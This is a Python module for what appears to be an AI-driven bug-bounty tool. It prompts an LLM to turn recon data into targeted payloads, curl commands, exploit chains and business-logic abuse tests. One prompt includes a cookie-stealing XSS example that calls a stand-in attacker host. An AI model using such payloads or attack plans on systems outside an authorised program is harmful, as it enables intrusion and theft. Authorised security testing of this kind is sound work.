"""
Opus-driven attack intelligence engine.

Three stages, each a separate Opus call:

  1. generate_attack_vectors(run_dir, program)
     Called after recon. Reads recon_summary.json + httpx raw output.
     Opus analyzes the real attack surface and generates targeted attack
     vectors with exact payloads — not generic categories. Understands
     tech stack, endpoint patterns, parameter names, business context.
     Output: attack_vectors.json

  2. generate_chain_analysis(run_dir)
     Called after triage.json exists. Reads confirmed findings and reasons
     about multi-step exploitation paths — XSS+CSRF chains, open redirect +
     OAuth hijack, IDOR + privilege escalation, etc.
     Output: chains.json

  3. generate_business_logic_probes(run_dir, program)
     Called after recon. Thinks about what this BUSINESS does and where
     logic lives that automated scanners never touch — price manipulation,
     workflow bypass, race conditions, tenant isolation, IDOR via enumeration,
     etc. Produces exact reproduction steps.
     Output: business_logic_probes.json

All three use claude-opus-4-8 via the claude CLI — same pattern as core/llm.py.
No Anthropic API key required.
"""

from __future__ import annotations

import json
import logging
import re
import shutil
import subprocess
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, parse_qs

log = logging.getLogger(__name__)

# Nominal label for output docs. The actual model is chosen by the "attack_engine"
# role in core.models (default claude-fable-5). Swapped off opus-4-8 per the
# fable-5 model preference.
_OPUS_MODEL = "claude-fable-5"

# How many live URLs / historical URLs to include in the prompt
# Opus has a large context but we still want signal not noise
_MAX_LIVE_URLS = 80
_MAX_HISTORICAL_SAMPLE = 120
_MAX_PARAMS = 200


# ---------------------------------------------------------------------------
# Stage 1 — Attack vector generation from recon
# ---------------------------------------------------------------------------

_ATTACK_VECTOR_SYSTEM = """You are an expert offensive security researcher and bug bounty hunter with deep expertise in web application exploitation. You do not write generic advice. You analyze real attack surfaces and produce targeted, specific, executable attack vectors for the exact target in front of you.

Your job: given recon data for a live target, reason like an attacker who has just finished recon and is deciding where to strike first. You know this target's tech stack, endpoints, parameter names, and business purpose. Use all of that to generate specific attacks — not category names.

ATTACK VECTOR REQUIREMENTS:
Each attack vector must have:
- An exact payload string ready to use (not a template — use actual URLs, parameter names, and values from the recon data)
- The precise delivery method (which URL, which parameter, which HTTP method, which header)
- What the attacker gains if it works
- What response indicates success (status code, redirect location, response body string, OOB callback, etc.)
- Which CVE or technique this maps to if applicable
- An exact curl command or HTTP request snippet the operator can run immediately

CHAIN THINKING:
Think about which findings could be combined for compounding impact. Explicitly tag vectors that are prerequisites or enablers for other vectors. An open redirect alone is low, but open redirect + OAuth = account takeover = critical.

BUSINESS LOGIC THINKING:
What does this business actually do? Where does money or trust flow? Where are state transitions that could be bypassed? Think about:
- Multi-step workflows that can be interrupted and replayed
- Privilege assumptions (can a free user access paid features?)
- Trust assumptions (can user A see user B's data via ID substitution?)
- Rate limiting and race conditions on high-value operations
- API versioning gaps (v1 endpoint still exposed behind v2 auth?)

OUTPUT FORMAT — respond with a JSON object ONLY, no markdown, no explanation:
{
  "attack_surface_assessment": "<2-3 sentences: what is this target, what attack surface stands out most>",
  "top_priority_vectors": ["<vector_id_1>", "<vector_id_2>", "<vector_id_3>"],
  "attack_vectors": [
    {
      "vector_id": "<uuid>",
      "title": "<specific title using real target details, not generic names>",
      "vulnerability_class": "<sqli|xss|ssrf|idor|auth_bypass|open_redirect|ssti|lfi|csrf|rce|business_logic|jwt_weakness|xxe|path_traversal|secret_exposure|subdomain_takeover|exposed_s3|misconfiguration>",
      "severity_estimate": "<critical|high|medium|low>",
      "target_url": "<exact URL from recon data>",
      "parameter": "<exact parameter name or header>",
      "payload": "<exact payload string — use actual values from recon, not placeholders>",
      "http_method": "<GET|POST|PUT|PATCH|DELETE>",
      "delivery": "<exact curl command or HTTP request snippet>",
      "success_indicator": "<exactly what the attacker looks for in the response>",
      "attacker_gain": "<specific data or access gained if this works>",
      "chain_enables": ["<other vector_ids this unlocks or amplifies>"],
      "chain_requires": ["<other vector_ids that must succeed first>"],
      "tool_commands": ["<tool name and exact flags to test this>"],
      "reasoning": "<why this specific endpoint/parameter is vulnerable based on the evidence>",
      "confidence": <0.0-1.0>
    }
  ],
  "quick_wins": [
    {
      "title": "<specific quick check>",
      "command": "<exact command to run>",
      "what_to_look_for": "<what indicates a finding>"
    }
  ]
}"""


def generate_attack_vectors(run_dir: Path, program: dict) -> Path:
    """
    Stage 1: Generate targeted attack vectors from recon data.
    Called after recon playbook completes.

    Returns path to attack_vectors.json.
    """
    recon_summary_path = run_dir / "recon_summary.json"
    if not recon_summary_path.exists():
        raise FileNotFoundError(f"recon_summary.json not found in {run_dir} — run recon first")

    with open(recon_summary_path) as f:
        recon = json.load(f)

    # Pull tech stack and endpoint data from httpx raw output
    httpx_path = run_dir / "raw_output" / "httpx.json"
    tech_detections: list[dict] = []
    if httpx_path.exists():
        with open(httpx_path) as f:
            httpx_doc = json.load(f)
        for finding in httpx_doc.get("findings", []):
            raw = finding.get("raw_output", {})
            if raw.get("technologies") or raw.get("webserver") or raw.get("status_code"):
                tech_detections.append({
                    "url": finding.get("url", ""),
                    "status": raw.get("status_code"),
                    "server": raw.get("webserver", ""),
                    "tech": raw.get("technologies", []),
                    "title": raw.get("title", ""),
                    "content_length": raw.get("content_length"),
                    "headers": {
                        k: v for k, v in (raw.get("headers") or {}).items()
                        if k.lower() in (
                            "server", "x-powered-by", "x-frame-options",
                            "content-security-policy", "set-cookie",
                            "access-control-allow-origin", "www-authenticate",
                            "x-aspnet-version", "x-generator",
                        )
                    },
                })

    # Extract unique parameter names from historical URLs
    params = _extract_params(recon.get("historical_urls", []) + recon.get("live_urls", []))

    # Select most interesting live URLs — prioritize depth and uniqueness
    live_urls = _select_interesting_urls(recon.get("live_urls", []))
    hist_sample = _select_interesting_urls(recon.get("historical_urls", []), limit=_MAX_HISTORICAL_SAMPLE)

    # Build the user message
    user_msg = _build_attack_surface_brief(
        program=program,
        subdomains=recon.get("subdomains", []),
        live_urls=live_urls,
        historical_sample=hist_sample,
        tech_detections=tech_detections,
        params=params,
    )

    log.info("[attack_engine] Calling Opus for attack vector generation (%d live URLs, %d params)...",
             len(live_urls), len(params))
    raw = _call_opus(_ATTACK_VECTOR_SYSTEM, user_msg)

    vectors_doc = _parse_json_response(raw, fallback_key="attack_vectors")
    vectors_doc["schema_version"] = "1.0"
    vectors_doc["created_at"] = _now()
    vectors_doc["run_id"] = _get_run_id(run_dir)
    vectors_doc["model"] = _OPUS_MODEL
    vectors_doc["live_url_count"] = len(live_urls)
    vectors_doc["param_count"] = len(params)

    out_path = run_dir / "attack_vectors.json"
    with open(out_path, "w") as f:
        json.dump(vectors_doc, f, indent=2)

    count = len(vectors_doc.get("attack_vectors", []))
    log.info("[attack_engine] attack_vectors.json written: %d vectors", count)
    return out_path


# ---------------------------------------------------------------------------
# Stage 2 — Chain analysis from triage findings
# ---------------------------------------------------------------------------

_CHAIN_ANALYSIS_SYSTEM = """You are an elite offensive security researcher specializing in multi-stage attack chains and complex exploitation paths. You have been given confirmed and suspected vulnerability findings from automated scanners that have already been triaged.

Your job: find the highest-impact attack paths by combining these findings. Think like an advanced attacker who has confirmed initial access or initial findings and is working toward maximum impact.

CHAIN CONSTRUCTION RULES:
1. A chain must be more impactful than any individual finding alone
2. Each step must use a CONFIRMED or likely-real finding (not speculation)
3. Produce the exact step-by-step reproduction path — if someone followed your steps, they would achieve the stated impact
4. Think about pivot points: where does initial foothold enable lateral movement?
5. Think about amplification: where does a low finding unlock a critical?

CHAIN PATTERNS TO CONSIDER:
- XSS + CSRF → one-click account takeover (steal CSRF token from DOM, forge state-changing request)
- Open redirect + OAuth → authorization code / access token theft (redirect_uri manipulation)
- SSRF → internal network scanning → cloud metadata access → credential exfiltration
- IDOR + sensitive object → bulk data exfiltration (enumerate IDs, download all records)
- Subdomain takeover → cookie scope abuse (set cookies for parent domain, session hijack)
- Misconfiguration + auth endpoint → credential stuffing amplification
- Path traversal + log poisoning → stored XSS or RCE
- JWT weakness (alg:none or weak secret) → privilege escalation to admin
- CORS misconfiguration + authenticated endpoint → cross-origin data steal
- Reflected XSS + service worker → persistent XSS (stored in SW cache)
- SQL injection + file write privilege → webshell drop → RCE
- Business logic bypass + high-value operation → financial fraud or unauthorized access

OUTPUT FORMAT — JSON only, no markdown:
{
  "chain_analysis_summary": "<2-3 sentence overall assessment of the most dangerous paths>",
  "chains": [
    {
      "chain_id": "<uuid>",
      "title": "<specific title describing the end state, e.g. 'Stored XSS via vendor registration → admin session hijack'>",
      "combined_impact": "<critical|high|medium>",
      "impact_description": "<exact attacker outcome: what data/access, from where, affecting whom>",
      "prerequisite_finding_ids": ["<finding_id from the input>"],
      "steps": [
        {
          "step_number": 1,
          "action": "<exact action, e.g. 'Register vendor account at /vendor/register with venWebUrl=javascript:fetch(attacker_host+document.cookie)'>",
          "using_finding_id": "<finding_id>",
          "expected_outcome": "<what happens after this step>",
          "curl_or_request": "<exact HTTP request or curl command>"
        }
      ],
      "detection_difficulty": "<low|medium|high — how hard is this to detect/prevent>",
      "business_impact": "<specific damage in business terms: data breach, account takeover, financial fraud, etc.>"
    }
  ],
  "unreachable_but_close": [
    {
      "title": "<chain that almost works but is missing one piece>",
      "what_is_missing": "<exactly what additional finding or condition would complete it>",
      "how_to_find_it": "<specific test to confirm the missing piece>"
    }
  ]
}"""


def generate_chain_analysis(run_dir: Path) -> Path:
    """
    Stage 2: Chain analysis from confirmed triage findings.
    Called after triage.json exists.

    Returns path to chains.json.
    """
    triage_path = run_dir / "triage.json"
    findings_path = run_dir / "findings.json"

    if not triage_path.exists():
        raise FileNotFoundError(f"triage.json not found in {run_dir} — run triage first")

    with open(triage_path) as f:
        triage_doc = json.load(f)

    findings_by_id: dict[str, dict] = {}
    if findings_path.exists():
        with open(findings_path) as f:
            findings_doc = json.load(f)
        for finding in findings_doc.get("findings", []):
            findings_by_id[finding["finding_id"]] = finding

    # Select findings worth chaining — exploitable and needs_more_info
    relevant_verdicts = [
        v for v in triage_doc.get("verdicts", [])
        if v.get("verdict") in ("exploitable", "needs_more_info")
    ]

    if not relevant_verdicts:
        log.info("[attack_engine] No exploitable findings to chain — writing empty chains.json")
        out_path = run_dir / "chains.json"
        doc = {
            "schema_version": "1.0",
            "created_at": _now(),
            "run_id": _get_run_id(run_dir),
            "model": _OPUS_MODEL,
            "chain_analysis_summary": "No exploitable findings to chain.",
            "chains": [],
            "unreachable_but_close": [],
        }
        with open(out_path, "w") as f:
            json.dump(doc, f, indent=2)
        return out_path

    # Enrich verdicts with full finding details
    enriched = []
    for v in relevant_verdicts:
        fid = v.get("finding_id", "")
        entry: dict = {
            "finding_id": fid,
            "verdict": v.get("verdict"),
            "adjusted_severity": v.get("adjusted_severity"),
            "reasoning": v.get("reasoning", ""),
            "impact": v.get("impact", ""),
            "attack_delivery": v.get("attack_delivery", ""),
        }
        if fid in findings_by_id:
            original = findings_by_id[fid]
            entry["type"] = original.get("type", "")
            entry["url"] = original.get("url", "") or original.get("host", "")
            entry["evidence"] = original.get("evidence", "")
            entry["severity_raw"] = original.get("severity_raw", "")
            entry["execution_status"] = original.get("execution_status", "")
        enriched.append(entry)

    user_msg = (
        f"Target: {_get_program_name(run_dir)}\n\n"
        f"Confirmed/suspected findings ({len(enriched)} total):\n\n"
        f"{json.dumps(enriched, indent=2)}"
    )

    log.info("[attack_engine] Calling Opus for chain analysis (%d findings)...", len(enriched))
    raw = _call_opus(_CHAIN_ANALYSIS_SYSTEM, user_msg)

    chains_doc = _parse_json_response(raw, fallback_key="chains")
    chains_doc["schema_version"] = "1.0"
    chains_doc["created_at"] = _now()
    chains_doc["run_id"] = _get_run_id(run_dir)
    chains_doc["model"] = _OPUS_MODEL

    out_path = run_dir / "chains.json"
    with open(out_path, "w") as f:
        json.dump(chains_doc, f, indent=2)

    count = len(chains_doc.get("chains", []))
    log.info("[attack_engine] chains.json written: %d chains", count)
    return out_path


# ---------------------------------------------------------------------------
# Stage 3 — Business logic probes
# ---------------------------------------------------------------------------

_BUSINESS_LOGIC_SYSTEM = """You are an expert in business logic vulnerabilities — the class of bugs that automated scanners never find because they require understanding what the application is supposed to do and how an attacker can abuse those expectations.

You have been given a target's attack surface: its tech stack, endpoints, functionality clues, and business context. Your job is to reason about WHAT this application does and generate specific tests for business logic flaws.

BUSINESS LOGIC FLAW CATEGORIES:
1. Workflow bypass — skip steps in a multi-stage process (checkout without payment, approval without review)
2. Privilege assumptions — access functionality intended for higher-privilege users
3. Race conditions — submit concurrent requests to claim resources twice or bypass limits
4. Quantity/price manipulation — modify values in client-controlled fields (price, discount, quantity)
5. Scope bypass — access data belonging to other users, tenants, or organizations
6. State manipulation — put the application into an inconsistent state by replaying or reordering requests
7. Trust boundary violations — use one account's tokens/sessions to act as another
8. Audit trail evasion — perform actions that succeed but aren't logged
9. Limit bypass — exceed rate limits, usage quotas, or feature restrictions
10. API versioning gaps — older API versions with different (weaker) authorization
11. Mobile/web parity gaps — mobile API endpoints with different validation than web
12. Webhook or callback abuse — trigger server-side actions by forging incoming callbacks

FOR EACH PROBE:
- Describe the exact sequence of HTTP requests to make
- Explain what the application SHOULD do vs. what a vulnerable implementation DOES
- Include the exact parameter values to manipulate
- Describe what a successful exploit looks like (what response, what side effect)
- Rate how likely this class of bug appears in this type of target

Think deeply about what this specific application does for its users. What does success look like for a legitimate user? At each step, ask: what would happen if an attacker skipped this step, repeated it, or modified the values?

OUTPUT FORMAT — JSON only, no markdown:
{
  "business_context": "<2-3 sentences describing what this application does and who uses it>",
  "highest_value_targets": ["<specific functionality worth most if abused>"],
  "probes": [
    {
      "probe_id": "<uuid>",
      "title": "<specific title — e.g. 'Price manipulation via client-side total field in /api/checkout'>",
      "flaw_category": "<category from the list above>",
      "likelihood": "<high|medium|low — how common in this type of app>",
      "target_flow": "<the business workflow being tested>",
      "vulnerability_hypothesis": "<what we think is wrong and why>",
      "test_steps": [
        {
          "step": 1,
          "action": "<exact action — e.g. 'Intercept POST /api/checkout in Burp and change price field from 99.99 to 0.01'>",
          "request": "<exact curl command or HTTP snippet>",
          "expected_vulnerable_response": "<what a vulnerable app returns>",
          "expected_fixed_response": "<what a correctly-implemented app returns>"
        }
      ],
      "success_indicator": "<what proves this is exploitable>",
      "impact": "<what the attacker gains>",
      "burp_tip": "<specific Burp tool and technique to use — Intruder, Repeater, etc.>"
    }
  ]
}"""


def generate_business_logic_probes(run_dir: Path, program: dict) -> Path:
    """
    Stage 3: Business logic probe generation.
    Called after recon. Does not require triage.

    Returns path to business_logic_probes.json.
    """
    recon_summary_path = run_dir / "recon_summary.json"
    if not recon_summary_path.exists():
        raise FileNotFoundError(f"recon_summary.json not found in {run_dir}")

    with open(recon_summary_path) as f:
        recon = json.load(f)

    # Pull tech + endpoint patterns
    httpx_path = run_dir / "raw_output" / "httpx.json"
    endpoint_patterns: list[dict] = []
    if httpx_path.exists():
        with open(httpx_path) as f:
            httpx_doc = json.load(f)
        for finding in httpx_doc.get("findings", []):
            raw = finding.get("raw_output", {})
            endpoint_patterns.append({
                "url": finding.get("url", ""),
                "status": raw.get("status_code"),
                "tech": raw.get("technologies", []),
                "title": raw.get("title", ""),
                "server": raw.get("webserver", ""),
            })

    # Extract path patterns from all URLs — reveals functionality clues
    all_paths = _extract_path_patterns(
        recon.get("live_urls", []) + recon.get("historical_urls", [])
    )

    user_msg = (
        f"Program: {program.get('name', 'unknown')} ({program.get('platform', 'unknown')})\n"
        f"Description: {program.get('description', 'No description provided')}\n"
        f"Target type: {program.get('target_type', 'web')}\n\n"
        f"In-scope domains: {json.dumps(program.get('in_scope', {}).get('domains', []))}\n\n"
        f"Discovered endpoints (sample of {min(len(endpoint_patterns), 60)}):\n"
        f"{json.dumps(endpoint_patterns[:60], indent=2)}\n\n"
        f"Path patterns discovered:\n{json.dumps(all_paths[:100], indent=2)}\n\n"
        f"Parameter names seen in historical URLs:\n"
        f"{json.dumps(_extract_params(recon.get('historical_urls', []))[:80], indent=2)}\n\n"
        f"Total live endpoints: {len(recon.get('live_urls', []))}\n"
        f"Total subdomains: {len(recon.get('subdomains', []))}"
    )

    log.info("[attack_engine] Calling Opus for business logic probe generation...")
    raw = _call_opus(_BUSINESS_LOGIC_SYSTEM, user_msg)

    probes_doc = _parse_json_response(raw, fallback_key="probes")
    probes_doc["schema_version"] = "1.0"
    probes_doc["created_at"] = _now()
    probes_doc["run_id"] = _get_run_id(run_dir)
    probes_doc["model"] = _OPUS_MODEL

    out_path = run_dir / "business_logic_probes.json"
    with open(out_path, "w") as f:
        json.dump(probes_doc, f, indent=2)

    count = len(probes_doc.get("probes", []))
    log.info("[attack_engine] business_logic_probes.json written: %d probes", count)
    return out_path


# ---------------------------------------------------------------------------
# Unified attack plan — runs all three and merges into one Markdown brief
# ---------------------------------------------------------------------------

def generate_attack_plan(run_dir: Path, program: dict) -> Path:
    """
    Run all three attack intelligence stages and produce a unified
    attack_plan.md that the operator can work from directly.

    Returns path to attack_plan.md.
    """
    results: dict[str, Path | str] = {}

    try:
        results["vectors"] = generate_attack_vectors(run_dir, program)
    except Exception as exc:
        log.error("[attack_engine] Attack vector generation failed: %s", exc)
        results["vectors"] = str(exc)

    try:
        results["logic"] = generate_business_logic_probes(run_dir, program)
    except Exception as exc:
        log.error("[attack_engine] Business logic probe generation failed: %s", exc)
        results["logic"] = str(exc)

    # Chains require triage — skip if not available
    triage_path = run_dir / "triage.json"
    if triage_path.exists():
        try:
            results["chains"] = generate_chain_analysis(run_dir)
        except Exception as exc:
            log.error("[attack_engine] Chain analysis failed: %s", exc)
            results["chains"] = str(exc)
    else:
        log.info("[attack_engine] triage.json not found — skipping chain analysis (run triage first)")

    # Build consolidated markdown brief
    lines: list[str] = [
        f"# Attack Plan — {program.get('name', 'unknown')}",
        f"Generated: {_now()}",
        "",
    ]

    if isinstance(results.get("vectors"), Path) and results["vectors"].exists():
        with open(results["vectors"]) as f:
            vdoc = json.load(f)
        lines.append("## Attack Surface Assessment")
        lines.append(vdoc.get("attack_surface_assessment", ""))
        lines.append("")
        lines.append("## Attack Vectors (priority order)")
        priority_ids = vdoc.get("top_priority_vectors", [])
        vectors = vdoc.get("attack_vectors", [])
        vectors_by_id = {v["vector_id"]: v for v in vectors}
        ordered = [vectors_by_id[i] for i in priority_ids if i in vectors_by_id]
        ordered += [v for v in vectors if v["vector_id"] not in priority_ids]
        for v in ordered:
            lines.append(f"### [{v.get('severity_estimate','?').upper()}] {v['title']}")
            lines.append(f"**Class:** {v.get('vulnerability_class','?')}  "
                         f"**Confidence:** {v.get('confidence', '?')}")
            lines.append(f"**Target:** `{v.get('target_url','?')}`  "
                         f"**Param:** `{v.get('parameter','?')}`")
            lines.append(f"**Payload:** `{v.get('payload','?')}`")
            lines.append(f"**Delivery:**")
            lines.append(f"```")
            lines.append(v.get("delivery", ""))
            lines.append(f"```")
            lines.append(f"**Success indicator:** {v.get('success_indicator','?')}")
            lines.append(f"**Attacker gains:** {v.get('attacker_gain','?')}")
            lines.append(f"**Reasoning:** {v.get('reasoning','')}")
            if v.get("chain_enables"):
                lines.append(f"**Enables chains:** {', '.join(v['chain_enables'])}")
            lines.append("")

        if vdoc.get("quick_wins"):
            lines.append("## Quick Wins")
            for qw in vdoc["quick_wins"]:
                lines.append(f"- **{qw['title']}**")
                lines.append(f"  `{qw['command']}`")
                lines.append(f"  → {qw['what_to_look_for']}")
            lines.append("")

    if isinstance(results.get("chains"), Path) and results["chains"].exists():
        with open(results["chains"]) as f:
            cdoc = json.load(f)
        lines.append("## Exploit Chains")
        lines.append(cdoc.get("chain_analysis_summary", ""))
        lines.append("")
        for chain in cdoc.get("chains", []):
            lines.append(f"### [{chain.get('combined_impact','?').upper()}] {chain['title']}")
            lines.append(f"**Impact:** {chain.get('impact_description','')}")
            lines.append(f"**Detection difficulty:** {chain.get('detection_difficulty','?')}")
            lines.append(f"**Business impact:** {chain.get('business_impact','')}")
            lines.append("")
            lines.append("**Steps:**")
            for step in chain.get("steps", []):
                lines.append(f"{step['step_number']}. {step['action']}")
                lines.append(f"   Expected: {step.get('expected_outcome','')}")
                if step.get("curl_or_request"):
                    lines.append(f"   ```")
                    lines.append(f"   {step['curl_or_request']}")
                    lines.append(f"   ```")
            lines.append("")
        if cdoc.get("unreachable_but_close"):
            lines.append("### Almost-Chains (missing one piece)")
            for near in cdoc["unreachable_but_close"]:
                lines.append(f"- **{near['title']}**")
                lines.append(f"  Missing: {near['what_is_missing']}")
                lines.append(f"  How to find it: {near['how_to_find_it']}")
            lines.append("")

    if isinstance(results.get("logic"), Path) and results["logic"].exists():
        with open(results["logic"]) as f:
            ldoc = json.load(f)
        lines.append("## Business Logic Probes")
        lines.append(ldoc.get("business_context", ""))
        lines.append("")
        lines.append(f"**Highest value targets:** {', '.join(ldoc.get('highest_value_targets', []))}")
        lines.append("")
        for probe in ldoc.get("probes", []):
            lines.append(f"### [{probe.get('likelihood','?').upper()}] {probe['title']}")
            lines.append(f"**Category:** {probe.get('flaw_category','?')}")
            lines.append(f"**Hypothesis:** {probe.get('vulnerability_hypothesis','')}")
            lines.append(f"**Target flow:** {probe.get('target_flow','')}")
            lines.append("")
            for step in probe.get("test_steps", []):
                lines.append(f"{step['step']}. {step['action']}")
                if step.get("request"):
                    lines.append(f"   ```")
                    lines.append(f"   {step['request']}")
                    lines.append(f"   ```")
                lines.append(f"   Vulnerable → {step.get('expected_vulnerable_response','')}")
                lines.append(f"   Fixed     → {step.get('expected_fixed_response','')}")
            lines.append(f"**Success:** {probe.get('success_indicator','')}")
            lines.append(f"**Impact:** {probe.get('impact','')}")
            lines.append(f"**Burp tip:** {probe.get('burp_tip','')}")
            lines.append("")

    plan_path = run_dir / "attack_plan.md"
    plan_path.write_text("\n".join(lines))
    log.info("[attack_engine] attack_plan.md written: %s", plan_path)
    return plan_path


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _call_opus(system_prompt: str, user_message: str) -> str:
    # Migrated onto the unified router (core.models). Routes to the
    # "attack_engine" role — fable-5 on the CLI by default, config-swappable.
    # Name kept to avoid churn at the three call sites; it is no longer opus.
    from core.models import complete
    comp = complete(
        "attack_engine",
        [{"role": "system", "content": system_prompt},
         {"role": "user", "content": user_message}],
        timeout=600,
    )
    return comp.text


def _parse_json_response(raw: str, fallback_key: str) -> dict:
    """Parse JSON from Opus response, handling markdown code fences."""
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        match = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", raw, re.DOTALL)
        if match:
            return json.loads(match.group(1))
        # Last resort: try to find opening brace
        brace = raw.find("{")
        if brace != -1:
            try:
                return json.loads(raw[brace:])
            except Exception:
                pass
        log.error("[attack_engine] Could not parse JSON response — returning raw text")
        return {fallback_key: [], "_raw_response": raw[:2000]}


def _extract_params(urls: list[str]) -> list[str]:
    """Extract unique query parameter names from a list of URLs."""
    params: set[str] = set()
    for url in urls:
        try:
            parsed = urlparse(url)
            for key in parse_qs(parsed.query):
                params.add(key)
        except Exception:
            pass
    return sorted(params)[:_MAX_PARAMS]


def _extract_path_patterns(urls: list[str]) -> list[str]:
    """
    Extract unique meaningful path patterns from URLs.
    /api/v1/users/123 → /api/v1/users/{id}
    Returns deduplicated, sorted list.
    """
    patterns: set[str] = set()
    for url in urls:
        try:
            path = urlparse(url).path
            if not path or path == "/":
                continue
            # Normalize numeric and UUID segments
            normalized = re.sub(r"/[0-9a-f]{8}-[0-9a-f-]{27}", "/{uuid}", path)
            normalized = re.sub(r"/\d+", "/{id}", normalized)
            patterns.add(normalized)
        except Exception:
            pass
    return sorted(patterns)


def _select_interesting_urls(urls: list[str], limit: int = _MAX_LIVE_URLS) -> list[str]:
    """
    Select the most interesting URLs — prefer deep paths, unique patterns,
    API endpoints, auth endpoints, admin panels.
    """
    if not urls:
        return []

    scored: list[tuple[int, str]] = []
    for url in urls:
        try:
            parsed = urlparse(url)
            path = parsed.path.lower()
            score = len(path.split("/"))  # prefer deeper paths

            # Boost interesting patterns
            interesting = [
                "api", "admin", "auth", "login", "oauth", "token", "user",
                "account", "profile", "password", "reset", "register", "signup",
                "upload", "file", "export", "import", "webhook", "callback",
                "payment", "checkout", "subscribe", "invoice", "billing",
                "v1", "v2", "v3", "graphql", "rpc", "ws",
            ]
            for kw in interesting:
                if kw in path:
                    score += 3

            # Boost if has query params
            if parsed.query:
                score += 2

            scored.append((score, url))
        except Exception:
            scored.append((0, url))

    scored.sort(key=lambda x: -x[0])

    # Deduplicate by path pattern to avoid 200 variants of /user/123
    seen_patterns: set[str] = set()
    result: list[str] = []
    for _, url in scored:
        try:
            path = urlparse(url).path
            normalized = re.sub(r"/\d+", "/{id}", path)
            if normalized not in seen_patterns:
                seen_patterns.add(normalized)
                result.append(url)
                if len(result) >= limit:
                    break
        except Exception:
            result.append(url)
            if len(result) >= limit:
                break

    return result


def _build_attack_surface_brief(
    program: dict,
    subdomains: list[str],
    live_urls: list[str],
    historical_sample: list[str],
    tech_detections: list[dict],
    params: list[str],
) -> str:
    return (
        f"Program: {program.get('name', 'unknown')} on {program.get('platform', 'unknown')}\n"
        f"Description: {program.get('description', 'No description')}\n"
        f"In-scope domains: {json.dumps(program.get('in_scope', {}).get('domains', []))}\n"
        f"Allowed test types: {json.dumps(program.get('allowed_test_types', []))}\n\n"
        f"=== ATTACK SURFACE ===\n\n"
        f"Subdomains discovered ({len(subdomains)} total, showing up to 60):\n"
        f"{json.dumps(subdomains[:60], indent=2)}\n\n"
        f"Live URLs (curated — {len(live_urls)} shown):\n"
        f"{json.dumps(live_urls, indent=2)}\n\n"
        f"Historical URLs sample (parameter-bearing — {len(historical_sample)} shown):\n"
        f"{json.dumps(historical_sample, indent=2)}\n\n"
        f"Technology detections ({len(tech_detections)} endpoints, showing up to 40):\n"
        f"{json.dumps(tech_detections[:40], indent=2)}\n\n"
        f"Unique parameter names from historical URLs ({len(params)} total):\n"
        f"{json.dumps(params, indent=2)}"
    )


def _get_run_id(run_dir: Path) -> str:
    manifest = run_dir / "run_manifest.json"
    if manifest.exists():
        try:
            with open(manifest) as f:
                return json.load(f).get("run_id", "unknown")
        except Exception:
            pass
    return "unknown"


def _get_program_name(run_dir: Path) -> str:
    manifest = run_dir / "run_manifest.json"
    if manifest.exists():
        try:
            with open(manifest) as f:
                return json.load(f).get("program_id", "unknown")
        except Exception:
            pass
    return run_dir.parent.name


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()
